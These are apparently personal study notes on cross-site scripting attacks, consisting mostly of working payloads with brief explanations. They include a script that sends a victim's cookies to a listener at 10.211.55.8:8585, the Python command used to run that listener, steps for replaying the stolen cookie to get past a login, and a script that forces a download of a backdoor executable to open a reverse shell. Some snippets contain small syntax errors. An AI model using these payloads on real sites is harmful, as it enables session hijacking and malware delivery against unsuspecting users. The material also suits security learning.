# Basic comments
```
<script>alert('This is XXS')</script>
```

# Stealing Cookies:
```
<script>document.write('<img src="http://10.211.55.8:8585/?'+document.cookie+'"/>);</script>
```

document.write => write a document to the listening server
http://10.211.55.8:8585/? => The listening server

Use Python module as a http server
```
python3 -m http.server 8585
```

Example output:
![[Pasted image 20260424061448.png]]

In firefox, download the Cookie manager extention.
Open it and replace the cookie with the one you received:
![[Pasted image 20260424062206.png]]

Then when you go to admin page or login page, it will no longer ask for he password as you have a valid cookie session.

# Redirect user
When redirecting a user, you can redirect to to a webpage or a download.
In this example we redirect them to a malicious download with a backdoor:
```
<script> var link = document.createElement('a');
link.href = 'http://10.211.55.8/document.exe';
link.download=";
document.body.appendChild(link);
link.click();< /script>
```
This link can redirect to a downloaded files which can be a backdoor or reverse shell.
This can be a PDF, Word, Excel, etc. files which can contain malicious content.
When the user opens the file a backdoor can run. 
You can listen with NC for example:
![[Pasted image 20260424063252.png]]

More XSS Scripts websites in the resource page.



